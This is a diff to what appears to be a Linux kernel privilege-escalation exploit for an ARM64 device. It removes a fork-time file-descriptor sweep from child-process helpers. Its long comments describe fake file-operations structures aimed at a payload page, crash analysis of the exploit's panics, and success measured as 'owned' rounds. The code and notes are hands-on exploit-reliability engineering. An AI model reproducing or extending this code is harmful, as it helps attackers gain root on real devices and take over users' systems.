@@ -1878,37 +1878,20 @@ static void child_handoff_memfd(int sv[2]) {
   close(sv[1]);
 }
 
-/*
- * fix70 (2026-10-25): redo8/redo9 identical-stack panic killer.
- *
- * Both rounds died with `Comm: pipe_prepare ... pc=0x0 lr=filp_close+0x54`
- * (IABT, blr 0) inside a SHORT-LIVED grandchild of the pipe_prepare child:
- * clone_memfd() = clone_child + open_memfd + kill_child -- the SIGKILL lands
- * ~1ms after fork (or leak_child _exit's after find_collisions), and
- * do_exit -> exit_files -> filp_close walks every INHERITED fd, including
- * the fake-fops probe fds (g_fops_probe_fd etc) whose file->f_op points at
- * the payload page.  If the payload page has died by exit time (win-dead
- * family), filp_close reads flush from the recycled page: the check load
- * sees residue != 0, the call load races init_on_alloc zeroing of the same
- * page, and the kernel blr's to 0 -> Fatal exception.  The pipe_prepare
- * child's own late sweep (pipe.c, after prepare returns) is too late for
- * these grandchildren -- they fork DURING prepare.
- *
- * Fix: drop every inherited fd in the child right after the memfd handoff,
- * i.e. at FORK time when the payload page is provably alive (win enter
- * dead=0 is the same second as the prep storm; page death comes seconds
- * later).  fix67 already zeroed flush/release on a live page, so this
- * close() hits cbz-skip and is safe; the exit path afterwards is fd-clean
- * no matter when the page dies.  The children need no fds after the
- * handoff (pause / futex collision scan are fd-free), so a blanket sweep
- * to 4096 is correct; 0/1/2 are kept.  Unknown-fork risk stays confined to
- * forks that genuinely need the cfgfs channel (root child, vp verify).
- */
-static void child_drop_inherited_fds(void) {
-  for (int fd = 3; fd < 4096; fd++)
-    close(fd);
-  g_fops_probe_fd = -1; /* fork-local copy; parent unaffected */
-}
+/* fix70 (child_drop_inherited_fds sweep in clone_child/clone_leak_child)
+ * ROLLED BACK 2026-10-25 redo13: the original redo8/9 attribution (storm
+ * grandchildren exiting onto dead fake fops) was OVERTURNED by redo10 --
+ * all three rounds' executor was the pipe_prepare child itself at
+ * close(conv_fd), fixed properly by fix71.  Meanwhile every round on the
+ * fix70 so (redo11/12/13, three independent boots, plus 3 in-boot convert
+ * retries on redo13) failed owned=0 with inuse stuck at 31-34, while all
+ * exam-period passing rounds ran fix69b WITHOUT fix70.  rel=68/68 handoff
+ * release and pre-sweep inuse=0 were healthy in all three -- the wave mm's
+ * simply never kmem_cache_free'd after batch kill on the fix70 so.
+ * Deterministic correlation across 3 boots; mechanism never established,
+ * but a wrong-fix regression beats an unexplained triple.  Reverted to
+ * fix69b fork semantics; fix71 kept (independent -- fail path safe three
+ * rounds running). */
 
 pid_t clone_child(void) {
   int sv[2];
@@ -1922,7 +1905,6 @@ pid_t clone_child(void) {
     }
     close(sv[0]);
     child_handoff_memfd(sv);
-    child_drop_inherited_fds(); /* fix70: before any exit can touch fake fops */
     pin_to_core(CORE);
     for (;;) {
       pause();
@@ -1941,7 +1923,6 @@ pid_t clone_leak_child(void) {
     ks_child_no_atexit = 1;
     close(sv[0]);
     child_handoff_memfd(sv);
-    child_drop_inherited_fds(); /* fix70: _exit below must not walk fake fops */
     kernelsnitch_find_collisions(ks);
     /* _exit, not exit: the child must NOT run the parent's inherited atexit
      * handlers (route_pi_release_atexit does FUTEX_UNLOCK_PI against the
